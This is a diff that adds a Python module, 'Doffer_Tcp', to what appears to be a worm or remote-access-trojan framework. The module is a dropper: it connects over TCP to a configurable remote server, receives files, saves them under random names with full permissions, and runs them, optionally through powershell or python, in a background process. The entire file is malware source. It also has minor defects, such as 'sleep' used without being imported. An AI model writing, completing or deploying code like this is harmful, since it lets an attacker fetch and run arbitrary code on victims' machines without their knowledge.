@@ -1,0 +1,105 @@
+#!name##Doffer_Tcp
+#!types##module
+#!info##Module whose task is to establish a connection of receiving files and running them. It uses TCP network sockets.
+#!reqVar##DOFT_IP##IP address of the server to connect.##str
+#!reqVar##DOFT_PORT##Port number##int
+#!reqVar##DOFT_start##Whether to run the files after downloading.##str
+#!setVar##DOFT_start##True##str
+#!reqVar##DOFT_exe_cmd##An additional command to run the file. e.g. with powershell script: “powershell”, if python then: “python” etc. Not required.
+
+import socket
+import os
+import subprocess
+import string
+import multiprocessing
+from threading import Thread
+from typing import Union
+from random import randint
+
+
+
+class Doffer_Tcp:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.ip = "{{DOFT_IP}}"
+        self.port = {{DOFT_PORT}}
+        self.execute = {{DOFT_start}}
+        self.raw_len = 1024
+        self.exe_cmd = "{{DOFT_exe_cmd}}"
+    
+    def gen_name(self) -> str:
+        name = ""
+        chars = string.ascii_letters
+        while len(name) < 15:
+            name += chars[randint(0, len(chars) - 1)]
+        return name
+
+    def save_file(self, data: bytes) -> Union[None, str]:
+        name = self.gen_name()
+        fpath = os.path.join(os.getcwd(), name)
+        try:
+            with open(fpath, "wb") as file:
+                file.write(data)
+            os.chmod(fpath, 0o777)
+            return fpath
+        except:
+            return None
+    
+    def connect(self) -> bool:
+        try:
+            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client.connect((self.ip, self.port))
+            return True
+        except:
+            return False
+    
+    def recive_file(self) -> Union[None, str]:
+        buff = b""
+        while True:
+            recv = self.client.recv(self.raw_len)
+            if recv:
+                if len(recv) < self.raw_len:
+                    buff += recv
+                    break
+                else:
+                    buff += recv
+            else:
+                if len(buff) == 0:
+                    return False
+                else:
+                    break
+        return self.save_file(buff)
+    
+    def _exe(self, fpath: str) -> None:
+        if len(self.exe_cmd) > 0:
+            cmd = f"{self.exe_cmd} {fpath}"
+        else:
+            cmd = fpath
+        try:
+            subprocess.run(cmd, text=True)
+        except:
+            pass
+    
+    def exe(self, fpath: str) -> None:
+        exe = multiprocessing.Process(target=self._exe, args=(fpath, ))
+        exe.start()
+
+    
+    def _start(self) -> None:
+        while True:
+            if not self.connect():
+                sleep(2)
+                continue
+            while True:
+                out = self.recive_file()
+                if out:
+                    self.exe(out)
+                else:
+                    sleep(1)
+                    break
+            break
+    
+    def start(self):
+        doffer = Thread(target=self._start)
+        doffer.start()
